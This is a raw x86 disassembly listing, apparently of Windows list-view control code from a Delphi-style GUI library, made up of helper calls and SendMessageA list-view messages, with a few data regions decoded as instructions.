call sub_3a7ae98
push ebp
call sub_3ad993c
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_3a7b224
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_3ad9a94
cwde
0x31103ad 0x322e
aaa
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp al 0x10
cmpsb [ esi ] [ edi ]
add ecx [ eax ]
inc ebx
outsd
insd
inc ebx
je r-xdata
add al ch
or al 0xe1
std
dec [ ebx + 0x4468bd8 ]
insb
jae r-xdata
inc ebp
cld
mov eax [ eax + 0x4 ]
call sub_3a7b21c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
rcl [ ebp - 0x75 ] 0xec
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_3ad9b64
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3a7afe4
mov eax [ esi + 0x4 ]
call sub_3a7b21c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ sub_3ad9a94 ]
call sub_3a665d0
add esp 0x4
mov eax [ esi + 0x4 ]
call sub_3a7b21c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3a7b21c
cmp esi eax
setne dl
mov eax [ ebp - 0x4 ]
call sub_3a7ae98
push ebp
call sub_3ad993c
pop ecx
pop esi
pop ebx
pop ecx
pop ebp
retn
inc ebx
xor esi esi
call sub_3a7b21c
mov esi eax
mov eax [ ebp - 0x4 ]
push eax
push esi
push 0x103a
push ebx
call __imp_SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad9b6b
lea eax [ ebp - 0x4 ]
mov edx [ sub_3ad9a94 ]
call sub_3a665dc
retn
mov eax [ esi + 0x4 ]
call sub_3ad9dd4
call sub_3ab7c38
mov ebx eax
mov eax [ esi + 0x4 ]
inc edi
xor ebx ebx
inc esi
dec ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_3a7b224
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ebx * 4 ] eax
inc ebx
dec edi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_3a7b224
cmp [ eax + 0x24 ] 0xffffffff
jle r-xdata
sub_3ad9b74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx esi
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_3a652f4
mov eax ebx
call sub_3ad9a38
sub_3ad9b9c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ad9dd4
call sub_3ab7c38
mov esi eax
mov eax ebx
call sub_3a7aebc
push 0x0
push eax
push 0x101d
push esi
call __imp_SendMessageA
mov [ ebx + 0x24 ] eax
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
call sub_3ad9dd4
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ad9dd4
cmp [ eax + 0x25d ] 0x3
jne r-xdata
cmp [ ebx + 0x24 ] 0xffffffff
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ad9dd4
call sub_3adcef8
test al al
je r-xdata
sub_3ad9c1c
cmp edx [ eax + 0x24 ]
je r-xdata
retn
mov ecx [ eax + 0x18 ]
cmp edx ecx
jge r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
jle r-xdata
test edx edx
jl r-xdata
mov [ eax + 0x24 ] edx
call sub_3ad9a38
cmp ecx edx
jge r-xdata
mov edx ecx
jmp r-xdata
mov edx ecx
sub_3ad9c48
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a7aebc
test eax eax
je r-xdata
mov [ esi + 0xc ] bl
xor edx edx
mov eax esi
call sub_3a7ae98
mov eax [ esi + 0x4 ]
call sub_3ad9dd4
mov edx [ eax ]
call [ edx + 0x84 ]
sub_3ad9c80
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0xd ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xd ] dl
mov eax [ ebx + 0x4 ]
call sub_3ad9dd4
test eax eax
je r-xdata
mov eax ebx
call sub_3ad9a38
mov eax [ ebx + 0x4 ]
call sub_3ad9dd4
mov si 0xffee
call sub_3a6457c
sub_3ad9ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aad0
pop esi
pop ebx
retn
movzx edx [ esi + 0xc ]
mov eax ebx
call sub_3ad9c48
movzx edx [ esi + 0xd ]
mov eax ebx
call sub_3ad9c80
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_3ad9b74
mov edx [ esi + 0x1c ]
mov eax ebx
call sub_3ad9cb4
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_3ad9cc4
mov edx [ esi + 0x18 ]
mov eax ebx
call sub_3ad9cd4
mov eax esi
call sub_3ad9b9c
mov edx eax
mov eax ebx
call sub_3ad9c1c
pop esi
pop ebx
retn
sub_3ad9d58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_3a652f4
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3a7aed4
sub_3ad9d7c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_3a7b014
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad9ddc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov eax ebx
call sub_3ad9dd4
call sub_3adee30
pop esi
pop ebx
retn
mov eax esi
call sub_3a7aebc
push eax
mov eax ebx
call sub_3ad9dd4
pop edx
call sub_3adee70
pop esi
pop ebx
retn
sub_3ad9e10
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_3ad9dd4
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor edx edx
push ebp
push sub_3ad9ef8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_3a7b21c
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a7b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ad9dd4
call sub_3ab7c38
mov esi eax
push 0x0
push ebx
push 0x101c
push esi
call __imp_SendMessageA
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3ad9dd4
call sub_3adee30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
inc esi
xor ebx ebx
mov [ edi ] 0x3
xor eax eax
mov [ edi + 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ad9dc0
mov eax [ eax + 0x24 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ad9dd4
call sub_3ab7c38
push edi
push ebx
push 0x101b
push eax
call SendMessageA
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ad9dc0
mov [ eax + 0x28 ] ebx
inc ebx
dec esi
jne r-xdata
sub_3ad9f08
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a7ae30
mov [ esi + 0x20 ] 0xff000008
lea eax [ esi + 0x1c ]
call sub_3a652a0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad9f60
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_3a652f4
mov dl 0x1
mov eax ebx
call sub_3a7ae98
pop esi
pop ebx
retn
sub_3ad9f90
inc [ eax ]
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
jo r-xdata
insb
jae r-xdata
fimul [ ebx + 0x13e8f845 ]
fdiv st5
dec [ ebx - 0x17387428 ]
out dx al
adc edx edi
dec [ ebx - 0x3ba7410 ]
lea edi [ ecx + edx * 8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
inc ebx
dec esi
jne r-xdata
lea eax [ esi + 0x1c ]
call sub_3a652a0
mov eax esi
test bl bl
je r-xdata
rcl [ ebp - 0x75 ] 0xec
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_3ada067
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xffff
call sub_3a6457c
mov [ ebp - 0x8 ] eax
mov eax edi
call sub_3a7b21c
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_3a665d0
add esp 0x4
mov eax edi
call sub_3a7b21c
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax edi
call sub_3ada078
mov edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
push esi
push edi
lea esi [ eax + 0xc ]
push eax
push esi
push 0x1041
push ebx
call __imp_SendMessageA
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x80 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ada06e
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_3a665dc
retn
mov eax [ ebp - 0x8 ]
call sub_3ab7c38
mov ebx eax
mov eax edi
call sub_3a7b21c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
inc esi
xor ebx ebx
sub_3ada090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ ecx + 0x3ad ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5f ] dh
lodsd [ esi ]
add eax [ eax ]
add [ eax ] al
in al dx
and [ edi - 0x59ba37fd ] 0xa645d403
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp esp
mov eax [ 0xffffffffabb403ad ]
cmpsd [ esi ] [ edi ]
add eax [ eax + edi * 4 ]
cmpsd [ esi ] [ edi ]
add ebx esp
mov dh 0xa7
add edi [ eax - 0x39 ]
cmpsd [ esi ] [ edi ]
add ebp [ edi + eax * 8 - 0x384ffc59 ]
cmpsd [ esi ] [ edi ]
add esi [ edi + eax * 8 - 0x4513fc59 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx ]
lodsd [ esi ]
add ecx [ eax + 0x5c03a7c9 ]
0x3a7
sub_3ada1a0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x38 ] esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ edi + 0x3c ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ada1ec
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax [ esi + 0x3c ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7c4c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ada21c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a7c51c
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x3c ]
call sub_3a7a33c
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_3ada350
mov eax esi
pop esi
pop ebx
retn
sub_3ada244
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a7c52c
mov esi eax
or edx 0xffffffff
mov eax [ ebx + 0x3c ]
call sub_3a7a33c
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_3ada350
mov eax esi
pop esi
pop ebx
retn
sub_3ada280
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7c608
mov edx esi
mov eax [ ebx + 0x3c ]
call sub_3a7a388
mov eax [ ebx + 0x38 ]
call sub_3ada578
pop esi
pop ebx
retn
sub_3ada2b0
push ebx
push esi
mov esi edx
mov eax [ eax + 0x38 ]
call sub_3ada474
mov ebx eax
mov eax ebx
call sub_3adceec
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x288 ]
call sub_3a7b21c
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_3adea98
cmp [ eax + 0x24 ] 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_3adee70
sub_3ada2f4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3a7c84c
or ecx 0xffffffff
mov edx ebx
mov eax [ esi + 0x3c ]
call sub_3a7a510
lea edi [ ebx + 0x1 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
mov edx edi
mov eax esi
call sub_3ada350
inc edi
dec ebx
jne r-xdata
sub_3ada334
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3a7c92c
lea edx [ esi + 0x1 ]
mov eax ebx
call sub_3ada350
pop esi
pop ebx
retn
sub_3ada350
push ebx
push esi
mov esi edx
mov ebx eax
push 0xffffffff
mov eax [ ebx + 0x38 ]
call sub_3ada9f8
push eax
mov eax ebx
call sub_3ada2a4
mov ecx esi
pop edx
call sub_3a86a68
mov edx esi
mov eax ebx
call sub_3ada2b0
pop esi
pop ebx
retn
sub_3ada3a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ada1a0
mov [ esi + 0x8 ] eax
mov [ esi + 0x1c ] 0xffffffff
mov [ esi + 0x20 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ada3f8
push ebx
push esi
push edi
push ebp
call sub_3a6478c
mov ebx edx
mov ebp eax
mov [ ebp + 0x28 ] 0x1
mov eax [ ebp + 0x4 ]
mov eax [ eax + 0x4 ]
cmp ebp [ eax + 0x2bc ]
jne r-xdata
mov eax ebp
call sub_3ada474
call sub_3ab7fd8
test al al
je r-xdata
xor edx edx
mov [ eax + 0x2bc ] edx
mov eax [ ebp + 0x8 ]
call sub_3a64380
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_3a7aaa4
test bl bl
jle r-xdata
mov eax ebp
call sub_3ada4a0
mov esi eax
mov eax ebp
call sub_3ada9f8
mov edi eax
push 0x0
push edi
push 0x1008
push esi
call __imp_SendMessageA
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
sub_3ada4b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ada4a0
cmp bl 0x1
cmc
sbb ecx ecx
pop edx
call sub_3a869c0
pop esi
pop ebx
retn
sub_3ada4d8
push ebx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x290 ] 0x0
jne r-xdata
movzx eax [ esi + 0x2a ]
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax ebx
call sub_3ab7c38
mov ebx eax
mov eax esi
call sub_3ada9f8
mov esi eax
push 0xf000
push esi
push 0x102c
push ebx
call __imp_SendMessageA
shr eax 0xc
dec eax
test eax eax
setne al
pop esi
pop ebx
retn
sub_3ada52c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax edi
call sub_3ada4d8
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edi + 0x2a ] bl
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x4 ]
cmp [ esi + 0x290 ] 0x0
jne r-xdata
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
mov eax edi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ab7c38
mov ecx ebx
pop edx
call sub_3a86a3c
sub_3ada578
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3ada4a0
mov esi eax
mov eax ebx
call sub_3ada9f8
mov ebx eax
push 0x0
push ebx
push 0x102a
push esi
call __imp_SendMessageA
test eax eax
setne al
neg al
sbb eax eax
pop esi
pop ebx
retn
sub_3ada5a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_3a656c8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x24 ]
mov edx esi
call sub_3a652f4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x290 ] 0x0
jne r-xdata
mov eax ebx
call sub_3ada474
call sub_3adceec
test al al
je r-xdata
push 0xffffffff
mov eax ebx
call sub_3ada9f8
push eax
mov eax ebx
call sub_3ada4a0
xor ecx ecx
pop edx
call sub_3a86a68
mov eax ebx
call sub_3ada474
movzx eax [ eax + 0x275 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov eax ebx
call sub_3ada474
mov eax [ eax + 0x288 ]
call sub_3a7b21c
test eax eax
jle r-xdata
mov eax ebx
call sub_3ada474
call sub_3ade81c
mov eax ebx
call sub_3ada474
xor edx edx
call sub_3adea98
cmp [ eax + 0x24 ] 0xffffffff
jg r-xdata
mov eax ebx
call sub_3ada474
call sub_3adee30
sub_3ada65c
push ebx
mov ebx eax
cmp edx [ ebx + 0xc ]
je r-xdata
pop ebx
retn
mov [ ebx + 0xc ] edx
mov eax ebx
call sub_3ada474
movzx eax [ eax + 0x275 ]
sub al 0x1
je r-xdata
mov eax ebx
call sub_3ada474
call sub_3ade81c
sub al 0x2
jne r-xdata
sub_3ada68c
push ebx
push esi
push edi
mov esi eax
cmp edx 0x4
ja r-xdata
xor ebx ebx
jmp [ edx * 4 + jump_table_3ada69d ]
mov ebx 0x4
jmp r-xdata
mov ebx 0x8
jmp r-xdata
mov ebx 0x1
jmp r-xdata
mov ebx 0x2
jmp r-xdata
mov ebx 0x20
jmp r-xdata
mov eax esi
call sub_3ada4a0
mov edi eax
mov eax esi
call sub_3ada9f8
push ebx
push eax
push 0x102c
push edi
call __imp_SendMessageA
test ebx eax
setne al
pop edi
pop esi
pop ebx
retn
sub_3ada6fc
push ebx
push esi
push edi
mov ebx eax
cmp edx 0x4
ja r-xdata
xor esi esi
jmp [ edx * 4 + jump_table_3ada70d ]
xor edi edi
mov edi esi
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x20
jmp r-xdata
push esi
mov eax ebx
call sub_3ada9f8
push eax
mov eax ebx
call sub_3ada4a0
mov ecx edi
pop edx
call sub_3a86a0c
pop edi
pop esi
pop ebx
retn
test cl cl
je r-xdata
sub_3ada76c
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi eax
xor ebx ebx
sub edx 0x1
jb r-xdata
cmp edi [ esi + 0x10 ]
je r-xdata
je r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov [ esi + 0x10 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x290 ] 0x0
jne r-xdata
cmp edi [ esi + 0x1c ]
je r-xdata
dec edx
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x290 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax esi
call sub_3ada9f8
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax esi
call sub_3ada4a0
mov edi eax
mov eax esp
push eax
push 0x0
push 0x1006
push edi
call __imp_SendMessageA
jmp r-xdata
mov bl 0x1
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x290 ] 0x0
jne r-xdata
cmp edi [ esi + 0x20 ]
je r-xdata
jmp r-xdata
mov eax esi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ada474
pop edx
pop ecx
call sub_3adc774
push 0xf00
mov eax esi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ada4a0
mov ecx [ esi + 0x1c ]
inc ecx
shl ecx 0x8
pop edx
call sub_3a86a0c
jmp r-xdata
mov bl 0x1
mov [ esi + 0x20 ] edi
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x2c0 ] 0x0
je r-xdata
cmp [ eax + 0x290 ] 0x0
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
push 0xf000
mov eax esi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ada4a0
lea ecx [ edi + 0x1 ]
shl ecx 0xc
pop edx
call sub_3a86a0c
xor edi edi
sub_3ada8ac
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
cmp edx [ ebx + 0x14 ]
je r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov [ ebx + 0x14 ] edx
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x290 ] 0x0
jne r-xdata
mov [ esp ] 0x10
mov [ esp + 0x24 ] edx
mov eax ebx
call sub_3ada9f8
mov [ esp + 0x4 ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_3ada4a0
mov esi eax
mov eax esp
push eax
push 0x0
push 0x1006
push esi
call __imp_SendMessageA
mov eax ebx
call sub_3ada9f8
push eax
mov eax ebx
call sub_3ada9f8
push eax
mov eax ebx
call sub_3ada474
pop edx
pop ecx
call sub_3adc774
sub_3ada924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_3a7aad0
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov esi eax
mov edx [ esi + 0x24 ]
mov eax ebx
call sub_3ada5a8
mov edx [ esi + 0xc ]
mov eax ebx
call sub_3ada65c
mov ecx [ esi + 0x10 ]
xor edx edx
mov eax ebx
call sub_3ada76c
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_3ada8ac
mov ecx [ esi + 0x1c ]
mov edx 0x1
mov eax ebx
call sub_3ada76c
mov ecx [ esi + 0x20 ]
mov edx 0x2
mov eax ebx
call sub_3ada76c
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_3ada9e4
mov eax esi
call sub_3ada4d8
mov edx eax
mov eax ebx
call sub_3ada52c
pop esi
pop ebx
retn
sub_3ada9bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x24 ]
mov edx [ esi + 0x24 ]
call sub_3a656c8
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
cmp eax [ esi + 0xc ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3adaa14
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
movzx eax bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_3ada9f8
push eax
mov eax esi
call sub_3ada4a0
mov ecx edi
pop edx
call sub_3a86984
pop edi
pop esi
pop ebx
retn
sub_3adaa50
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3ada388
cmp edi eax
je r-xdata
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_3ada39c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x290 ] 0x0
jne r-xdata
mov [ esp ] 0x2
mov [ esp + 0x1c ] 0xffffffff
mov eax ebx
call sub_3ada9f8
mov [ esp + 0x4 ] eax
inc esi
mov [ esp + 0x8 ] esi
mov eax ebx
call sub_3ada4a0
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x1006
push ebx
call __imp_SendMessageA
sub_3adaac4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3adab00
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3adacb4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a7aaa4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3adab38
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov edi ecx
mov esi eax
test edx edx
jne r-xdata
mov ebx edx
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x108 ]
mov ebx eax
jmp r-xdata
mov eax esi
call sub_3adabc0
mov ebp eax
push esp
mov ecx ebx
mov edx edi
mov eax esi
call sub_3adb72c
mov eax esp
push eax
push 0x0
push 0x1007
push ebp
call __imp_SendMessageA
mov eax ebx
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_3adab94
mov edi eax
test edi edi
jge r-xdata
sub_3adab94
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_3adabc0
push 0x0
push 0x0
push 0x1004
push eax
call __imp_SendMessageA
pop ebx
retn
sub_3adabcc
push ebx
push esi
push edi
add esp 0xffffffd8
mov edi edx
mov ebx eax
xor esi esi
mov eax [ ebx + 0x4 ]
call sub_3ab7c38
test eax eax
je r-xdata
mov eax esi
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov [ esp ] 0x4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_3adabc0
mov ebx eax
mov eax esp
push eax
push 0x0
push 0x1005
push ebx
call __imp_SendMessageA
test eax eax
je r-xdata
mov eax esp
xor ecx ecx
mov edx 0x28
call sub_3a63a44
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0x8 ] eax
mov edx esp
mov eax [ ebx + 0x4 ]
call sub_3add204
mov esi eax
jmp r-xdata
mov esi [ esp + 0x20 ]
sub_3adac80
push ebx
mov ebx edx
test ebx ebx
je r-xdata
call sub_3adabc0
push 0x0
push ebx
push 0x102f
push eax
call __imp_SendMessageA
pop ebx
retn
call sub_3adabc0
push 0x1
push ebx
push 0x102f
push eax
call SendMessageA
pop ebx
retn
sub_3adacb4
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_3ab7fd8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_3adabc0
mov ebx eax
push 0x0
push 0x0
push 0x1009
push ebx
call __imp_SendMessageA
sub_3adacf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
test dl dl
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
movzx edx [ eax + 0x275 ]
mov [ eax + 0x2d8 ] dl
xor edx edx
call sub_3ade854
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
